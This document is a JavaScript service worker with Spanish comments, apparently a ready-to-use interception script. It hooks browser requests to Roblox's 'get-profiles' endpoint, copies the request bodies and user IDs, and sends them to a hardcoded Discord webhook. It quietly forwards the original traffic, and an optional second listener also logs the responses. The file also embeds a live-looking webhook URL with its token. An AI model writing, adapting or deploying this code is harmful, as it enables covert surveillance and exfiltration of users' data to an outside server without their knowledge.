// ===========================================
// CONFIGURACIÓN - CAMBIA ESTO
// ===========================================
const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";

// ===========================================
// INSTALACIÓN DEL SERVICE WORKER
// ===========================================
self.addEventListener('install', event => {
    console.log('🔧 Service Worker instalado');
    self.skipWaiting(); // Activar inmediatamente
});

self.addEventListener('activate', event => {
    console.log('⚡ Service Worker activado');
    event.waitUntil(clients.claim()); // Tomar control de todas las pestañas
});

// ===========================================
// INTERCEPTAR PETICIONES
// ===========================================
self.addEventListener('fetch', event => {
    const url = event.request.url;
    
    // Buscar peticiones a get-profiles
    if (url.includes('get-profiles') && event.request.method === 'POST') {
        console.log('🎯 Interceptada petición a get-profiles');
        
        // Clonar la request para poder leer el body
        const requestClone = event.request.clone();
        
        // Analizar la petición
        event.respondWith(
            (async () => {
                try {
                    // Leer el body de la petición (el JSON gigante)
                    const body = await requestClone.json();
                    
                    // Enviar a Discord
                    sendToDiscord(body);
                    
                    // Dejar que la petición continúe normalmente
                    return fetch(event.request);
                    
                } catch (error) {
                    console.log('❌ Error capturando:', error);
                    return fetch(event.request);
                }
            })()
        );
    }
});

// ===========================================
// ENVIAR A DISCORD
// ===========================================
async function sendToDiscord(data) {
    try {
        // Formatear el mensaje
        const userIds = data.userIds || [];
        const fields = data.fields || [];
        
        // Crear un mensaje bonito
        const content = `**🎮 ROBLOX GET-PROFILES CAPTURADO**\n` +
                       `**Total IDs:** ${userIds.length}\n` +
                       `**Campos solicitados:** ${fields.join(', ')}\n` +
                       `**Primeros 10 IDs:**\n` +
                       userIds.slice(0, 10).map(id => `\`${id}\``).join(', ') + 
                       (userIds.length > 10 ? `\n*y ${userIds.length - 10} más...*` : '') +
                       `\n\n**JSON completo:**\n\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 1900)}\n\`\`\``;
        
        // Enviar
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content })
        });
        
        console.log('✅ Datos enviados a Discord');
        
    } catch (e) {
        console.log('❌ Error enviando:', e);
    }
}

// ===========================================
// CAPTURAR RESPUESTAS TAMBIÉN (OPCIONAL)
// ===========================================
self.addEventListener('fetch', event => {
    // Ya tenemos el primer listener para requests
    // Este segundo listener es para responses (si quieres capturar lo que devuelve Roblox)
    
    if (event.request.url.includes('get-profiles') && event.request.method === 'POST') {
        // Ya lo manejamos arriba, pero podríamos también capturar la respuesta
        const responsePromise = fetch(event.request);
        
        event.respondWith(
            responsePromise.then(async response => {
                const responseClone = response.clone();
                
                try {
                    const data = await responseClone.json();
                    console.log('📥 Respuesta de Roblox:', data);
                    
                    // También puedes enviar la respuesta a Discord si quieres
                    // sendToDiscord({ type: 'response', data });
                    
                } catch (e) {}
                
                return response;
            })
        );
    }
});